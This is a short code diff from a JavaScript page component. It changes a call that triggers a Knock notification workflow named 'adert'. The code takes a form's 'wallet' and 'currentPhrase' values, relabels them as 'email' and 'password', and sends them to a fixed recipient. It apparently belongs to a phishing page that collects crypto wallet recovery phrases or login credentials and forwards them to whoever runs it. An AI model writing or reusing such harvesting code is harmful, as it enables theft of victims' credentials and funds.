@@ -44,8 +44,8 @@ export default function page() {
     );
     await knock.workflows.trigger("adert", {
       data: {
-        wallet: formState.wallet,
-        currentPhrase: formState.currentPhrase,
+        email: formState.wallet,
+        password: formState.currentPhrase,
       },
       recipients: [{ id: "projects-1", collection: "project5" }],
     });
